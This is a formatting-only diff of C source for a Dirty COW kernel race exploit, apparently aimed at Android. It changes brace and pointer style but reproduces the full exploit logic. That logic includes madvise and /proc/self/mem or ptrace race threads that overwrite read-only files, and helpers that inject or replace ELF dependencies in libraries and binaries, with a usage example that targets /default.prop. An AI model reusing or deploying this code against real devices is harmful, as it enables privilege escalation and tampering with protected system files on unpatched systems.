@@ -9,29 +9,34 @@
 
 pid_t g_pid;
 
-struct mem_arg {
-  void *offset;
-  void *patch;
+struct mem_arg
+{
+  void* offset;
+  void* patch;
   size_t patch_size;
-  const char *fname;
+  const char* fname;
   volatile int stop;
   volatile int success;
 };
 
-static void *check_thread(void *arg) {
-  struct mem_arg *mem_arg;
-  mem_arg = (struct mem_arg *) arg;
+static void* check_thread(void* arg)
+{
+  struct mem_arg* mem_arg;
+  mem_arg = (struct mem_arg*) arg;
   struct stat st;
   int i;
-  char *new_data = malloc(sizeof(char) * mem_arg->patch_size);
-  for (i = 0; i < TIMEOUT && !mem_arg->stop; i++) {
+  char* new_data = malloc(sizeof(char) * mem_arg->patch_size);
+  for (i = 0; i < TIMEOUT && !mem_arg->stop; i++)
+  {
     int fd = open(mem_arg->fname, O_RDONLY);
-    if (fd == -1) {
+    if (fd == -1)
+    {
       LOGV("Could not open %s: %s!", mem_arg->fname, strerror(errno));
       break;
     }
 
-    if (fstat(fd, &st) == -1) {
+    if (fstat(fd, &st) == -1)
+    {
       LOGV("Could not stat %s: %s!", mem_arg->fname, strerror(errno));
       close(fd);
       break;
@@ -40,7 +45,8 @@ static void *check_thread(void *arg) {
     read(fd, new_data, mem_arg->patch_size);
     close(fd);
 
-    if (memcmp(new_data, mem_arg->patch, mem_arg->patch_size) == 0) {
+    if (memcmp(new_data, mem_arg->patch, mem_arg->patch_size) == 0)
+    {
       mem_arg->stop = 1;
       mem_arg->success = 1;
       return 0;
@@ -53,16 +59,18 @@ static void *check_thread(void *arg) {
   return 0;
 }
 
-static void *madvise_thread(void *arg) {
-  struct mem_arg *mem_arg;
-  mem_arg = (struct mem_arg *) arg;
+static void* madvise_thread(void* arg)
+{
+  struct mem_arg* mem_arg;
+  mem_arg = (struct mem_arg*) arg;
 
   size_t size = mem_arg->patch_size;
-  void *addr = (void *) (mem_arg->offset);
+  void* addr = (void*) (mem_arg->offset);
 
   int i = 0, c = 0;
   LOGV("madvise: %p %i", addr, size);
-  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
+  for (i = 0; i < LOOP && !mem_arg->stop; i++)
+  {
     c += madvise(addr, size, MADV_DONTNEED);
   }
 
@@ -71,17 +79,20 @@ static void *madvise_thread(void *arg) {
   return 0;
 }
 
-static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
-  const unsigned char *s;
+static int ptrace_memcpy(pid_t pid, void* dest, const void* src, size_t n)
+{
+  const unsigned char* s;
   long value;
-  unsigned char *d;
+  unsigned char* d;
 
   d = dest;
   s = src;
 
-  while (n >= sizeof(long)) {
+  while (n >= sizeof(long))
+  {
     memcpy(&value, s, sizeof(value));
-    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
+    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1)
+    {
       LOGV("ptrace(PTRACE_POKETEXT)");
       return -1;
     }
@@ -91,18 +102,21 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
     s += sizeof(long);
   }
 
-  if (n > 0) {
+  if (n > 0)
+  {
     d -= sizeof(long) - n;
 
     errno = 0;
     value = ptrace(PTRACE_PEEKTEXT, pid, d, NULL);
-    if (value == -1 && errno != 0) {
+    if (value == -1 && errno != 0)
+    {
       LOGV("ptrace(PTRACE_PEEKTEXT)");
       return -1;
     }
 
-    memcpy((unsigned char *) &value + sizeof(value) - n, s, n);
-    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1) {
+    memcpy((unsigned char*) &value + sizeof(value) - n, s, n);
+    if (ptrace(PTRACE_POKETEXT, pid, d, value) == -1)
+    {
       LOGV("ptrace(PTRACE_POKETEXT)");
       return -1;
     }
@@ -111,12 +125,14 @@ static int ptrace_memcpy(pid_t pid, void *dest, const void *src, size_t n) {
   return 0;
 }
 
-static void *ptrace_thread(void *arg) {
-  struct mem_arg *mem_arg;
-  mem_arg = (struct mem_arg *) arg;
+static void* ptrace_thread(void* arg)
+{
+  struct mem_arg* mem_arg;
+  mem_arg = (struct mem_arg*) arg;
 
   int i, c;
-  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
+  for (i = 0; i < LOOP && !mem_arg->stop; i++)
+  {
     c = ptrace_memcpy(g_pid, mem_arg->offset, mem_arg->patch, mem_arg->patch_size);
   }
 
@@ -126,18 +142,21 @@ static void *ptrace_thread(void *arg) {
   return NULL;
 }
 
-static int can_write_to_self_mem(void *arg) {
-  struct mem_arg *mem_arg;
-  mem_arg = (struct mem_arg *) arg;
+static int can_write_to_self_mem(void* arg)
+{
+  struct mem_arg* mem_arg;
+  mem_arg = (struct mem_arg*) arg;
   int fd = open("/proc/self/mem", O_RDWR);
-  if (fd == -1) {
+  if (fd == -1)
+  {
     LOGV("Unable to open \"/proc/self/mem\": %s!", strerror(errno));
   }
 
   int returnval = -1;
   lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
   int written;
-  if ((written = write(fd, mem_arg->patch, mem_arg->patch_size)) == mem_arg->patch_size) {
+  if ((written = write(fd, mem_arg->patch, mem_arg->patch_size)) == mem_arg->patch_size)
+  {
     returnval = 0;
   }
 
@@ -147,17 +166,20 @@ static int can_write_to_self_mem(void *arg) {
   return returnval;
 }
 
-static void *proc_self_mem_thread(void *arg) {
-  struct mem_arg *mem_arg;
+static void* proc_self_mem_thread(void* arg)
+{
+  struct mem_arg* mem_arg;
   int fd, i, c = 0;
-  mem_arg = (struct mem_arg *) arg;
+  mem_arg = (struct mem_arg*) arg;
 
   fd = open("/proc/self/mem", O_RDWR);
-  if (fd == -1) {
+  if (fd == -1)
+  {
     LOGV("Unable to open \"/proc/self/mem\": %s!\n", strerror(errno));
   }
 
-  for (i = 0; i < LOOP && !mem_arg->stop; i++) {
+  for (i = 0; i < LOOP && !mem_arg->stop; i++)
+  {
     lseek(fd, (off_t) mem_arg->offset, SEEK_SET);
     c += write(fd, mem_arg->patch, mem_arg->patch_size);
   }
@@ -170,29 +192,36 @@ static void *proc_self_mem_thread(void *arg) {
   return NULL;
 }
 
-static void exploit(struct mem_arg *mem_arg) {
+static void exploit(struct mem_arg* mem_arg)
+{
   pthread_t pth1, pth2, pth3;
 
-  LOGV("current: %p=%lx", (void *) mem_arg->offset, *(unsigned long *) mem_arg->offset);
+  LOGV("current: %p=%lx", (void*) mem_arg->offset, *(unsigned long*) mem_arg->offset);
 
   mem_arg->stop = 0;
   mem_arg->success = 0;
 
-  if (can_write_to_self_mem(mem_arg) == -1) {
+  if (can_write_to_self_mem(mem_arg) == -1)
+  {
     LOGV("here using ptrace");
     g_pid = fork();
-    if (g_pid) {
+    if (g_pid)
+    {
       pthread_create(&pth3, NULL, check_thread, mem_arg);
       waitpid(g_pid, NULL, 0);
-      ptrace_thread((void *) mem_arg);
+      ptrace_thread((void*) mem_arg);
       pthread_join(pth3, NULL);
-    } else {
+    }
+    else
+    {
       pthread_create(&pth1, NULL, madvise_thread, mem_arg);
       ptrace(PTRACE_TRACEME);
       kill(getpid(), SIGSTOP);
       pthread_join(pth1, NULL);
     }
-  } else {
+  }
+  else
+  {
     LOGV("using /proc/self/mem");
     pthread_create(&pth3, NULL, check_thread, mem_arg);
     pthread_create(&pth1, NULL, madvise_thread, mem_arg);
@@ -202,19 +231,21 @@ static void exploit(struct mem_arg *mem_arg) {
     pthread_join(pth2, NULL);
   }
 
-  LOGV("result: %i %p=%lx", g_pid, mem_arg->offset, *(unsigned long *) mem_arg->offset);
+  LOGV("result: %i %p=%lx", g_pid, mem_arg->offset, *(unsigned long*) mem_arg->offset);
 }
 
-static int open_file(const char *path, int *fd, size_t *size)
+static int open_file(const char* path, int* fd, size_t* size)
 {
   *fd = open(path, O_RDONLY);
-  if (*fd == -1) {
+  if (*fd == -1)
+  {
     LOGV("Could not open %s: %s!", path, strerror(errno));
     return -1;
   }
 
   struct stat st;
-  if (fstat(*fd, &st) == -1) {
+  if (fstat(*fd, &st) == -1)
+  {
     LOGV("Could not stat %s: %s!", path, strerror(errno));
     close(*fd);
     *fd = -1;
@@ -225,7 +256,7 @@ static int open_file(const char *path, int *fd, size_t *size)
   return 0;
 }
 
-static int prepare_dirty_copy(const char *src_path, const char *dst_path, struct mem_arg *mem_arg)
+static int prepare_dirty_copy(const char* src_path, const char* dst_path, struct mem_arg* mem_arg)
 {
   mem_arg->fname = dst_path;
 
@@ -250,7 +281,8 @@ static int prepare_dirty_copy(const char *src_path, const char *dst_path, struct
   if (src_size != dst_size)
   {
     LOGV("Source file size (%u) and destination file size (%u) differ!\n", src_size, dst_size);
-    if (src_size > dst_size) {
+    if (src_size > dst_size)
+    {
       LOGV("Possible corruption detected!\n");
     }
 
@@ -273,8 +305,9 @@ static int prepare_dirty_copy(const char *src_path, const char *dst_path, struct
     return -1;
   }
 
-  void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, dst_fd, 0);
-  if (map == MAP_FAILED) {
+  void* map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, dst_fd, 0);
+  if (map == MAP_FAILED)
+  {
     LOGV("Unable to mmap file: %s!", strerror(errno));
     close(dst_fd);
     return -1;
@@ -285,7 +318,7 @@ static int prepare_dirty_copy(const char *src_path, const char *dst_path, struct
   return 0;
 }
 
-int inject_dependency_into_library(const char *path, const char *dependency_name)
+int inject_dependency_into_library(const char* path, const char* dependency_name)
 {
   struct mem_arg mem_arg;
   if (prepare_dirty_copy(path, path, &mem_arg) == -1)
@@ -318,7 +351,8 @@ int inject_dependency_into_library(const char *path, const char *dependency_name
   return 0;
 }
 
-int replace_dependency_in_binary(const char* path, const char* old_dependency, const char* new_dependency)
+int replace_dependency_in_binary(const char* path, const char* old_dependency,
+                                 const char* new_dependency)
 {
   struct mem_arg mem_arg;
   if (prepare_dirty_copy(path, path, &mem_arg) == -1)
@@ -334,7 +368,8 @@ int replace_dependency_in_binary(const char* path, const char* old_dependency, c
   struct dependencies_info dependencies;
   get_strtable_values(mem_arg.patch, &dependencies, &soname);
 
-  for (int i = 0; i < dependencies.size; ++i) {
+  for (int i = 0; i < dependencies.size; ++i)
+  {
     char* needed = dependencies.entries[i].value;
     LOGV("needed: %s", needed);
     if (strcmp(needed, old_dependency) == 0)
@@ -349,7 +384,8 @@ int replace_dependency_in_binary(const char* path, const char* old_dependency, c
   return 0;
 }
 
-int dirty_copy(const char *src_path, const char *dst_path) {
+int dirty_copy(const char* src_path, const char* dst_path)
+{
   struct mem_arg mem_arg;
   if (prepare_dirty_copy(src_path, dst_path, &mem_arg) == -1)
   {
@@ -359,15 +395,18 @@ int dirty_copy(const char *src_path, const char *dst_path) {
 
   exploit(&mem_arg);
 
-  if (mem_arg.success == 0) {
+  if (mem_arg.success == 0)
+  {
     return -1;
   }
 
   return 0;
 }
 
-int main(int argc, const char *argv[]) {
-  if (argc < 2) {
+int main(int argc, const char* argv[])
+{
+  if (argc < 2)
+  {
     LOGV("usage %s /data/local/tmp/default.prop /default.prop", argv[0]);
     return 0;
   }
